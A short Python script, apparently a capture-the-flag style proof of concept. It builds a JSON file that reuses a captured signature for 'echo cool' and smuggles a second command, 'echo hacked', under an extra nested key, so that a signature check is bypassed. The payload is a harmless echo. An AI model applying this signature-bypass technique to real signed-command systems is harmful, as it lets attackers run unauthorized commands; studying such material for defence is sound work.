import json


def generate_example():
    return json.dumps({'command': 'echo cool', 'signature': '007152ab1a65e9e864928d0f5cc6f47e8ce6217c09f7e7518d3d15f901e33df7e4bd760e2538929bdf2c5bf710b2babbcb2f268f458551ecbee78df22f3bb039696a2fccf58ccdeeb0c235e36593aa4b8be3d62e4ae6a59f6aebf78e3aec5b1685672bff191969731a096fa8f9ef29926bbee303d0673482410a25d00c46bdc1'})


def generate_exploit():
    old_sig = '007152ab1a65e9e864928d0f5cc6f47e8ce6217c09f7e7518d3d15f901e33df7e4bd760e2538929bdf2c5bf710b2babbcb2f268f458551ecbee78df22f3bb039696a2fccf58ccdeeb0c235e36593aa4b8be3d62e4ae6a59f6aebf78e3aec5b1685672bff191969731a096fa8f9ef29926bbee303d0673482410a25d00c46bdc1'
    return json.dumps({'a': {'command': 'echo hacked'}, 'command': 'echo cool', 'signature': old_sig}, sort_keys=True)


def main(argv):
    if not 2 <= len(argv) <= 3:
        print('USAGE: %s [--example] <script-path>' % argv[0])
        return 1
    if len(argv) == 2:
        example, path = False, argv[1]
    else:
        example, path = True, argv[2]
    if example:
        script = generate_example()
    else:
        script = generate_exploit()
    with open(path, 'w') as writer:
        writer.write(script)
    print('done')


if __name__ == '__main__':
    import sys
    sys.exit(main(sys.argv))
